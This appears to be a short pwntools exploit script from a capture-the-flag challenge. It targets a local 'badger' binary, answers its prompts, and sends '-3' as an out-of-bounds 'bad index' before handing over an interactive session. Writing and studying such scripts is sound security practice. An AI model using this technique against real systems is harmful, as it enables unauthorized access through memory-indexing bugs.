#!/usr/bin/env python3

from pwn import *

DEBUG = False
REMOTE = False

context.log_level = "DEBUG" if DEBUG else "INFO"

server_string = "127.0.0.1:1337"
host, port = server_string.split(":")
port = int(port)

if REMOTE:
    p = remote(host, port)
else:
    p = process("./badger")
p.recvuntil(b"name:")       # Name prompt
p.sendline("blackfell")
p.recvuntil(b"title:")      # Job prompt
p.sendline("wannabe")
p.recvuntil(b"tagline:")    # Tagline prompt
p.sendline("-3")                # Send the bad index

p.interactive()             # No fancy parsing needed!
